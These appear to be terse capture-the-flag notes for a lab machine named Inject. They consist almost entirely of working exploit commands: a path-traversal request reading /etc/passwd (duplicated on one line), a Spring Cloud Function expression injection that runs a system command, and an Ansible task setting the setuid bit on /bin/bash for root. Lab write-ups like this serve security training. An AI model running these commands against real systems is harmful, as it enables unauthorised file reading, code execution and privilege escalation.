# Inject

This involved changing the ansible playbook after initial foothold

```
curl http://10.129.178.113:8080/show_image?img=../../../../../../etc/passwdcurl http://10.129.178.113:8080/show_image?img=../../../../../../etc/passwd
```

LFI vulnerability

```
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' --data-raw 'data' -v
```


```
- hosts: localhost
  tasks:
  - name: giving me root shell
    ansible.builtin.shell: |
      chmod u+s /bin/bash
    become: true 
```